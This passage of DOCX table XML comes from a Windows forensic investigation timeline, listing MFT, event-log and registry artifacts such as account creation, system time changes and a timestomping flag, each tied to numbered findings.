              <w:t>{"Timestamp": "2023-11-09 18:58:23.3861757", "BatchKeyPath": "ROOT\\ControlSet001\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0001", "DriverDesc": "Intel(R) 82574L Gigabit Network Connection", "BatchValueName": "Multiple", "DriverDate": "6-12-2018", "DriverVersion": "12.17.10.8", "ProviderName": "Microsoft", "DeviceInstanceid": "PCI\\VEN_8086&amp;DEV_10D3&amp;SUBSYS_07D015AD&amp;REV_00\\000C29FFF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_NetworkAdapters.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:49:40.979782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $SI modification (M)</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\drivers\etc\hosts</w:t>
              <w:br/>
              <w:t>size=824 [SI&lt;FN: possible timestomping]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#54482</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2022-07-19 23:09:06</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI modification (M)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\Tools\Forensic_Program_Files\SysinternalsSuite\PsExec.exe</w:t>
              <w:br/>
              <w:t>size=440216 [zero µs]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#137433</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:41.058742</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 1 | Microsoft-Windows-Kernel-General | The system time was changed | OldTime: 2023-11-09 19:00:30.0951550 | NewTime: 2023-11-09 11:02:41.0583308 | Reason: An application or system component changed the time.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27708</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:41.058859</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\svchost.exe</w:t>
              <w:br/>
              <w:t>Security 4616 | Microsoft-Windows-Security-Auditing | The system time was changed | PreviousTime: 2023-11-09 19:00:30.0951550 | NewTime: 2023-11-09 11:02:41.0583308 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25172</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:46.526328</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>Administrator RID=500 logons=0 groups=Administrators [disabled]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_UserAccounts.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011, F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:58.466478</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>medmondson RID=1001 logons=7 groups=Administrators</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_UserAccounts.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:58.475556</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: DESKTOP-KJ81A5A\medmondson (S-1-5-21-1841083384-974204330-411256071-1001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25457</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:58.563802</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Builtin\Administrators (S-1-5-32-544) | SubjectLogonId: 0x3E7 | MemberName: - | MemberSid: S-1-5-21-1841083384-974204330-411256071-1001 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25467</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:09:53.533599</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational 21 | Microsoft-Windows-TerminalServices-LocalSessionManager | Remote Desktop Services: Session logon succeeded | Session ID: 2 | LOCAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23406</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:22:18.737962</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\RuntimeBroker.exe (WIN-ELL0II3NDSJ)</w:t>
              <w:br/>
              <w:t>System 1074 | User32 | A user initiated a system restart | Hostname: DESKTOP-KJ81A5A | Reason: Other (Unplanned) | Type: power off | Code: 0x0 | C:\Windows\System32\RuntimeBroker.exe (WIN-ELL0II3NDSJ)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27759</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:05.585121</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\TimeZoneInformation</w:t>
              <w:br/>
              <w:t>System Info | System Time Zone Information | TimeZoneKeyName=Pacific Standard Time | Pacific Standard Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#2164</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:05.585121</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\TimeZoneInformation</w:t>
              <w:br/>
              <w:t>System Info | System Time Zone Information | ActiveTimeBias=480 | 480</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#2165</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:21.136176</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 6009 | EventLog</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27546</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:17.220160</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd, complementary batch)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\Session Manager</w:t>
              <w:br/>
              <w:t>Persistence | Session Manager BootExecute | BootExecute=autocheck autochk *</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_complement/recmd_complement_C.csv#34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
